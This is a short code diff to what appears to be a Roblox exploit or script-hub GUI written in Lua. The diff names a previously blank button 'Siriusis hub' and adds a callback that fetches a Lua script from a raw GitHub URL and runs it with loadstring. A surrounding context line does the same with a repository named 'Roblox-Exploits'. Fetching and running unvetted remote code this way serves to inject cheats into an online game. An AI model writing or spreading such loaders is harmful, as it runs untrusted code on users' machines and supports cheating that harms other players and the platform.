@@ -3953,8 +3953,9 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/FFJ1/Roblox-Exploits/
   	end    
 })
 Tab:AddButton({
-	Name = "",
+	Name = "Siriusis hub",
 	Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xdevslasher/Siriusisbetter/main/xyz.bb.lua"))()
       		print("button pressed")
   	end    
 })
